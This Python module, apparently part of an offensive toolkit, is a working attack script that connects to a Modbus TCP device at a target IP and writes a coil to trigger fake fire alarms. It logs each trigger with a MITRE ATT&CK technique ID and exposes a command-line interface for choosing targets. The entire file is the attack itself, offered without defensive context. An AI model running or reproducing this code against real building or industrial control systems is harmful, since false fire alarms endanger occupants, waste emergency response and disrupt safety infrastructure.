#!/usr/bin/env python3
# modules/attacks/fire_alarm_faker.py

import os
import time
import json
import argparse
from datetime import datetime
from pymodbus.client.sync import ModbusTcpClient

LOG_FILE = "results/fire_alarm_faker_log.json"
MITRE_TTP = "T1491.001"

def log_alarm(ip, unit, coil):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "coil_address": coil,
        "unit_id": unit,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def trigger_fire_alarm(ip, port, unit_id, coil_address):
    try:
        client = ModbusTcpClient(ip, port=port)
        client.connect()
        client.write_coil(coil_address, True, unit=unit_id)
        log_alarm(ip, unit_id, coil_address)
        client.close()
        print(f"[✓] Fire alarm triggered at {ip}:{port}, coil {coil_address}")
    except Exception as e:
        print(f"[!] Failed to trigger fire alarm: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger fake fire alarms via Modbus TCP")
    parser.add_argument("--ip", required=True, help="Target Modbus device IP")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit", type=int, default=1)
    parser.add_argument("--coil", type=int, default=0)
    args = parser.parse_args()

    trigger_fire_alarm(args.ip, args.port, args.unit, args.coil)
